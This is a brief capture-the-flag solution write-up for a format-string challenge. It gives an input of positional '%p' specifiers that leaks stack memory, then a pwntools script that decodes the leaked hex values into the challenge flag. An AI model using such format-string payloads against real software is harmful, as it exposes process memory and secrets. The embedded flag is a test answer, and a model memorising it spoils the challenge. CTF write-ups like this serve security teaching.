# Leak

Send the following input (might be slightly different on systems)
```
%14$p.%15$p.%16$p.%17$p
```

# Unhex:

```python

from pwn import *

sol = b''

a = '0x61336c7b51425447.0x68545f6c6c615f6b.0x2173676e31745f65.0x7d2121'.replace('0x','')
flag = a.split('.')

for part in flag:
    sol += unhex(part)[::-1]

log.success(sol)

```

